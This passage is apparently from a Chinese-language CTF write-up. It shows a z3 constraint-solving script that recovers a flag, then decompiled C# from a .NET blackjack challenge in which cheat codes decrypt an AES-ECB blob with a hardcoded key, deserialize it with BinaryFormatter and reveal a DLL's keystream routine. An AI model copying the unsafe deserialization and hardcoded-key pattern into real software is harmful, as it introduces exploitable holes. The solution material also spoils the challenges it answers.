style=&#34;color:#ae81ff&#34;&gt;139406&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;109646&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;286309&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;175476&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;138067&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;192825&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;199577&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;63091&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;285207&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;58820340&lt;/span&gt;

s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Solver()

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;):
    s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(a1[i] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;)
    s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(a1[i] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7f&lt;/span&gt;)

s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;f&amp;#39;&lt;/span&gt;))
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;l&amp;#39;&lt;/span&gt;))
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;))
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;g&amp;#39;&lt;/span&gt;))
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;{&amp;#39;&lt;/span&gt;))
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; ord(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;}&amp;#39;&lt;/span&gt;))

s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(con1 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(con2 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(con3 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(con4 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(con5 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(con6 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(con7 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(con8 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(con9 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(con10 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(con11 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(con12 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(con13 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(con14 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(con15 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(con16 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(con17 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(con18 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(con19 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(con20 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(con21 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(con22 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(con23 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(con24 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(con25 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(con26 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(con27 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(con28 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(con29 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(con30 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(con31 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; sat &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;check():
    m &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;model()
    flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; a1:
        flag &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; chr(m[i]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;as_long())

&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; hashlib

hl &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; hashlib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;md5()
hl&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;update(flag&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode())
print (hl&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hexdigest() &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;042905954c2c27f21bd74489ea0d151f&amp;#39;&lt;/span&gt;)
print (flag)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;gamemaster&#34;&gt;GameMaster&lt;/h2&gt;
&lt;p&gt;.net逆向&lt;/p&gt;
&lt;p&gt;一个21点游戏，逆向发现存在作弊码&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (memcmp1(input, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;MF3K&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;)) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; {
        game.Player.Bet -= &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;m;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i = &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &amp;lt; memory.Length; i++) {
            memory[i] ^= &lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;;
        }
        Environment.SetEnvironmentVariable(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AchivePoint1&amp;#34;&lt;/span&gt;, game.Player.Balance.ToString());
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
     }
}
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (memcmp1(input, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;EEPW&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;)) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; {
        game.Player.Balance += &lt;span style=&#34;color:#ae81ff&#34;&gt;175&lt;/span&gt;m;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;[] key = &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;]
        {
            &lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;114&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;105&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;110&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;115&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;116&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;111&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;114&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;109&lt;/span&gt;,
            &lt;span style=&#34;color:#ae81ff&#34;&gt;105&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;110&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;103&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;
        };
        RijndaelManaged rijndaelManaged = &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; RijndaelManaged();
        rijndaelManaged.Key = key;
        rijndaelManaged.Mode = CipherMode.ECB;
        rijndaelManaged.Padding = PaddingMode.Zeros;
        ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
        m = cryptoTransform.TransformFinalBlock(memory, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, memory.Length);
        Environment.SetEnvironmentVariable(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AchivePoint2&amp;#34;&lt;/span&gt;, game.Player.Balance.ToString());
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
    }
}
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (memcmp1(input, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;6VD6&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;)) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt; {
        game.Player.Balance -= &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;m;
        Environment.SetEnvironmentVariable(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AchivePoint3&amp;#34;&lt;/span&gt;, game.Player.Balance.ToString());
        BinaryFormatter binaryFormatter = &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; BinaryFormatter();
        MemoryStream serializationStream = &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; MemoryStream(m);
        binaryFormatter.Deserialize(serializationStream);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;依次触发三个作弊码，就会对文件内容进行解密并反序列化&lt;/p&gt;
&lt;p&gt;解密后发现序列化内容中包含了一个dll文件：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; Check1(&lt;span style=&#34;color:#66d9ef&#34;&gt;ulong&lt;/span&gt; x, &lt;span style=&#34;color:#66d9ef&#34;&gt;ulong&lt;/span&gt; y, &lt;span style=&#34;color:#66d9ef&#34;&gt;ulong&lt;/span&gt; z, &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;[] KeyStream)
{
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; num = -&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i = &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span style=&#34;color:#ae81ff&#34;&gt;320&lt;/span&gt;; i++)
    {
        x = (((x &amp;gt;&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt; ^ x &amp;gt;&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; ^ x &amp;gt;&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt; ^ x &amp;gt;&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;) &amp;amp; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;UL) | x &amp;lt;&amp;lt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
        y = (((y &amp;gt;&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt; ^ y &amp;gt;&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;) &amp;amp; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;UL) | y &amp;lt;&amp;lt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
        z = (((z &amp;gt;&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt; ^ z &amp;gt;&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt; ^ z &amp;gt;&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt; ^ z &amp;gt;&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; ^ z &amp;gt;&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; ^ z &amp;gt;&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;) &amp;amp; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;UL) | z &amp;lt;&amp;lt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; flag = i % &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; == &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (flag)
        {
            num++;
        }
        KeyStream[num] = (&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;)((&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)((&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)KeyStream[num] &amp;lt;&amp;lt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) | (&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)((&lt;span style=&#34;color:#66d9ef&#34;&gt;ulong&lt;/span&gt;)((&lt;span style=&#34;color:#66d9ef&#34;&gt;uint&lt;/span&gt;)((z &amp;gt;&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt; &amp;amp; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;UL &amp;amp; (x &amp;gt;&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt; &amp;amp; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;UL)) ^ (((z &amp;gt;&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt; &amp;amp; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;UL) ^ &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;UL) &amp;amp; (y &amp;gt;&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt; &amp;amp; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;UL))))));
    }
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; ParseKey(&lt;span style=&#34;color:#66d9ef&#34;&gt;ulong&lt;/span&gt;[] L, &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;[] Key)
{
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i = &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &amp;lt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;; i++)
    {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; j = &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; j &amp;lt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;; j++)
        {
            Key[i * &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; + j] = (&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;)(L[i] &amp;gt;&amp;gt; j * &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &amp;amp; &lt;span style=&#34;color:#ae81ff&#34;&gt;255&lt;/span&gt;UL);
        }
    }
}

&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; T1()
{
    &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;
    {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; environmentVariable = Environment.GetEnvironmentVariable(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AchivePoint1&amp;#34;&lt;/span&gt;);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; environmentVariable2 = Environment.GetEnvironmentVariable(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AchivePoint2&amp;#34;&lt;/span&gt;);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;string&lt;/span&gt; environmentVariable3 = Environment.GetEnvironmentVariable(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;AchivePoint3&amp;#34;&lt;/span&gt;);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;bool&lt;/span&gt; flag = environmentVariable == &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt; || environmentVariable2 == &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt; || environmentVariable3 == &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (!flag)
        {
            &lt;span style=&#34;color:#66d9ef&#34;&gt;ulong&lt;/span&gt; num = &lt;span style=&#34;color:#66d9ef&#34;&gt;ulong&lt;/span&gt;.Parse(environmentVariable);
            &lt;span style=&#34;color:#66d9ef&#34;&gt;ulong&lt;/span&gt; num2 = &lt;span style=&#34;color:#66d9ef&#34;&gt;ulong&lt;/span&gt;.Parse(environmentVariable2);
            &lt;span style=&#34;color:#66d9ef&#34;&gt;ulong&lt;/span&gt; num3 = &lt;span style=&#34;color:#66d9ef&#34;&gt;ulong&lt;/span&gt;.Parse(environmentVariable3);
            &lt;span style=&#34;color:#66d9ef&#34;&gt;ulong&lt;/span&gt;[] array = &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;ulong&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;];
            &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;[] array2 = &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;];
